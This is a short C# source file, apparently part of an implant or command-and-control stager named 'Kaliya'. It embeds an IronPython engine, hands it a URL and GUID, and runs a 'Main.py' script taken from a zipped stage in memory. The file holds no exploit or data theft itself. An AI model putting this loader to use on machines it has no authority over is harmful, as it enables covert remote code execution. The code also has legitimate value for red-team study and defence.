using System;
using IronPython.Hosting;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.IO.Compression;
using Kaliya.Utils;
using Microsoft.Scripting.Hosting;

namespace Kaliya.Engines.IronPython
{
    internal static class Host
    {
        public static void Run(Uri url, Guid guid, ZipStorer stage)
        {
            var engine = CreateEngine();

            using (var engineStream = new MemoryStream())
            {
                engine.Runtime.IO.SetOutput(engineStream, Encoding.UTF8);
                engine.Runtime.IO.SetErrorOutput(engineStream, Encoding.UTF8);

                var scope = engine.CreateScope();

                scope.SetVariable("URL", url);
                scope.SetVariable("GUID", guid);
#if DEBUG
                scope.SetVariable("DEBUG", true);
#elif RELEASE
                scope.SetVariable("DEBUG", false);
#endif
                var mainPyFile = Resources.GetResourceInZip(stage, "Main.py");

                engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0,
                        mainPyFile.Length),
                    scope);
            }
        }

        private static dynamic CreateEngine()
        {
            var setup = Python.CreateRuntimeSetup(
                new Dictionary<string, object>
                {
                    ["Debug"] = false
                });
            var runtime = new ScriptRuntime(setup);
            return Python.GetEngine(runtime);
        }
    }
}